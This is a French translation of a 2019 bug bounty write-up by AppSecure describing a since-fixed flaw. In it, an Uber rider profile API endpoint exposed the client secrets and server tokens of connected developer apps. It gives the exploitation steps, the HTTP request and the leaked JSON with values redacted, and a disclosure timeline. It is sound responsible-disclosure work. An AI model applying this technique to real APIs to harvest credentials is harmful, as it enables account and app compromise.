---
title: 'Rapport de prime : comment nous avons découvert que les applications développeur
  d''Uber fuitaient le secret client et...'
subtitle: ''
author: freeCodeCamp
co_authors: []
series: null
date: '2019-02-19T14:07:53.000Z'
originalURL: https://freecodecamp.org/news/leakage-of-client-secret-server-tokens-of-all-uber-developer-applications-657d9d7fd30e
coverImage: https://cdn-media-1.freecodecamp.org/images/1*5cU8gS2vFolwBtJbv_9SpQ.png
tags:
- name: api
  slug: api
- name: bug bounty
  slug: bug-bounty
- name: Security
  slug: security
- name: 'tech '
  slug: tech
- name: uber
  slug: uber
seo_title: 'Rapport de prime : comment nous avons découvert que les applications développeur
  d''Uber fuitaient le secret client et...'
seo_desc: 'By AppSecure

  This is being published with the permission of Uber under the responsible disclosure
  policy.

  The vulnerability detailed in this blog post is being disclosed by Anand Prakash
  and Manisha Sangwan of team AppSecure. This was plugged quickly...'
---

Par AppSecure

_Ceci est publié avec la permission d'Uber dans le cadre de la politique de divulgation responsable._

La vulnérabilité détaillée dans cet article de blog est divulguée par [Anand Prakash](https://twitter.com/sehacure) et [Manisha Sangwan](https://www.linkedin.com/in/manisha-sangwan-98b9244a/) de l'équipe [AppSecure](https://appsecure.in). Cela a été rapidement corrigé par l'équipe d'ingénierie d'Uber.

Cet article concerne une vulnérabilité de fuite d'informations sur riders.uber.com dans laquelle nous avons identifié un point de terminaison d'API public de [https://riders.uber.com/profile](https://riders.uber.com/profile) qui pouvait renvoyer des jetons serveur et des secrets clients pour les applications autorisées par le propriétaire du compte à accéder à leur compte Uber.

Selon la [documentation](https://developer.uber.com/docs/businesses/guides/authentication) d'Uber :

> _"Le secret de votre application, cela doit être traité comme le mot de passe de votre application. Ne partagez jamais cela avec qui que ce soit, ne l'intégrez pas dans le code source, ni ne le publiez dans un forum public. De plus, cela ne doit pas être distribué sur des appareils clients où les utilisateurs pourraient décompiler votre code et accéder au secret. Si vous suspectez que votre client_secret a été compromis, vous pouvez en générer un nouveau dans le tableau de bord de votre application, ce qui invalidera immédiatement l'ancien secret."_

Cela aurait pu être facilement exploité par un attaquant en connectant leur compte à une application Uber en production, puis en utilisant le point de terminaison de profil pour récupérer les jetons serveur et les secrets clients de l'application connectée dans la réponse de l'API.

Uber a résolu ce problème en supprimant ces données de la réponse de l'API, comme signalé. Uber a publiquement notifié tous les développeurs de cette vulnérabilité et a demandé aux développeurs de faire tourner les secrets de manière périodique.

![Image](https://cdn-media-1.freecodecamp.org/images/OMCDfDQdImuNb4ruNqBPwCGX5wlb6i19ufET)
_Notification envoyée par Uber aux développeurs._

### À propos d'Uber

Uber est une société de réseau de transport (TNC) basée à San Francisco, en Californie. Uber propose des services incluant le covoiturage pair-à-pair, la réservation de taxis, la livraison de nourriture et un système de partage de vélos. La société opère dans 785 zones métropolitaines à travers le monde. Uber a une valorisation de plus de 100 milliards de dollars selon le rapport de [Bloomberg](https://www.bloomberg.com/news/articles/2018-10-16/uber-valued-at-120-billion-in-an-ipo-maybe).

### Comment mon exploit a fonctionné étape par étape

#### Étape #1

L'attaquant connecte une application développeur Uber aléatoire à leur compte en utilisant OAuth. Quelques exemples d'applications développeur Uber sont [IFTTT](https://eng.uber.com/ifttt-uber-automation/), [Payfare](https://uber-developers.news/uber-and-payfare-partner-to-pay-driver-partners-right-away-eec7a1f5335c?source=rss----49ee238f1dea---4&gi=e6336207cb0e), et [Bixby](https://uber-developers.news/uber-and-samsung-team-up-to-leverage-contextual-awareness-on-galaxy-s8-and-s8-935f5b5dbab8). Ce n'est pas identifié comme une procédure compliquée pour l'instant.

#### **Étape #2**

Une fois les applications ci-dessus connectées par l'attaquant à leur compte Uber, ils peuvent utiliser le point de terminaison pour obtenir les données confidentielles de l'application développeur et d'autres informations significatives de l'application en utilisant les données de session de l'attaquant.

**L'API Uber vulnérable :**

`POST /api/getAuthorisedApps HTTP/1.1`  
`Host: riders.uber.com`  
`User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:62.0) Gecko/20100101 Firefox/62.0`  
`Accept: */*`  
`Accept-Language: en-US,en;q=0.5`  
`Accept-Encoding: gzip, deflate`  
`Referer: [https://riders.uber.com/profile](https://riders.uber.com/profile)`  
`content-type: application/json`  
`x-csrf-token: XXX`  
`origin: [https://riders.uber.com](https://riders.uber.com)`  
`Content-Length: 2`  
`Cookie:`

**Données fuitées dans la réponse de l'API :**

`{"status":"success","data":{"data":{"uuid":"xxxx"},"clientScopes":{"authorizedClientScopes":[{"clientID":"xxx","scopes":["history","offline_access","profile"]}]},"scopeDetails":[{"applicationDetails":{"applicationID":"xxx","owner":{"userUUID":"xxxx","userEmail":""},"applicationSecret":"xxx","name":"xxx","description":"abc","privacyPolicyURL":"[https://appsecure.in](https://appsecure.in)","surgeConfirmedRedirectURI":"","webhookURL":"","applicationType":"","requestsPerHour":{"low":0,"high":0,"unsigned":false},"redirectURIs":["xxxxxx"],"appSignatures":[],"defaultScopes":["history","profile"],"whitelistedScopes":[],"originURIs":[],"serverTokens":["xxx"],"ipWhitelist":[],"admins":[{"userUUID":"xxxx","userEmail":""},{"userUUID":"xxxx","userEmail":""},{"userUUID":"xxxx","userEmail":""}],"developers":[{"userUUID":"xxxx","userEmail":""}],"tags":[],"oauthEnabled":false,"smsVerificationEnabled":false,"cobrandingEnabled":false,"supplyOnly":false,"isInternal":true,"cobrandingDetails":{"nativeURL":"","androidFallbackURL":"","iosFallbackURL":"","displayName":"","linkName":"","logoUUID":"","logoFiletype":"","generatedLogoURL":""},"availableScopes":["delivery","history","history_lite","places","profile","ride_widgets"],"openScopes":["delivery","history","history_lite","places","profile","ride_widgets"],"developerScopes":["all_trips","request","request_receipt"],"createdAt":{"low":xxx,"high":0,"unsigned":false},"updatedAt":{"low":xxx,"high":0,"unsigned":false},"displayName":null,"iconURL":null,"publicDescription":null,"appGalleryDetails":{"mobilePlatforms":[],"publicationState":"","redirectURI":"xxxx","permissionState":""}},"permissions":null,"userRoleInvitations":null}]}}`

#### **Chronologie de la divulgation**

**5 octobre 2018 :** Rapport envoyé à l'équipe de sécurité d'Uber.

**6 novembre 2018 :** Problème résolu par Uber. AppSecure a demandé à Uber de notifier tous les développeurs au cas où leurs secrets d'application ne seraient plus confidentiels. Nous avons vérifié la correction.

**20 décembre 2018 :** Uber a répondu en déclarant : "Ils sont en train de notifier les développeurs et de mettre en place une correction à long terme pour ce problème."

**8 février 2019 :** Uber nous a récompensés avec une prime de 5000 $ et a notifié tous les développeurs par email à ce sujet. Le problème a été publiquement divulgué après que l'action ait été menée.